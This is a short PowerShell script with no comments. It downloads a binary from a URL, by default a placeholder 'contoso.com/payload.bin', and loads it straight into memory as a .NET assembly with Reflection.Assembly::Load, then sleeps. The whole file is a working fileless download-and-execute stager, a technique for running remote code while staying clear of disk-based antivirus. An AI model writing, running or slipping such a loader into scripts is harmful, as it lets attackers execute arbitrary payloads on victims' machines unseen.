[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://contoso.com/payload.bin"
)
$AssemblyBytes = (New-Object System.Net.WebClient).DownloadData($DownloadUrl)
[Reflection.Assembly]::Load($AssemblyBytes)
Start-Sleep -Seconds 43
